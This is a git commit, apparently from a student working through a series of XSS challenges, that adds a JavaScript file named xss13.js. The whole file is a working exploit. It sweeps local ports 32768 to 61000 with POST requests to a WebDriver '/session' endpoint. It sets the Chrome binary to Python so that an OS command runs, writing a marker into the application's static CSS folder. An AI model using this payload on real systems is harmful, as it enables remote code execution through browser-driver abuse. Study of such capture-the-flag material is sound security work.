2964a153d90c5009b357e9f03fbc0fea18a6646b
Nguyễn Văn Việt <viet.nv2416836@sis.hust.edu.vn>
2026-02-19 15:31:11 +0700

    xss 13

---
+++ xss13.js
@@ -0,0 +1,19 @@
+let options = {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+        capabilities: {
+        alwaysMatch: {
+            browserName: "chrome",
+            "goog:chromeOptions": {
+            binary: "/usr/local/bin/python",
+            args: ["-c", "__import__('os').system('echo pwned > /app/application/static/css/pwn.css')"]
+            },
+        },
+        },
+    }),
+    };
+for (let port = 32768; port < 61000; port++) {
+fetch(`http://0.0.0.0:${port}/session`, options);
+}
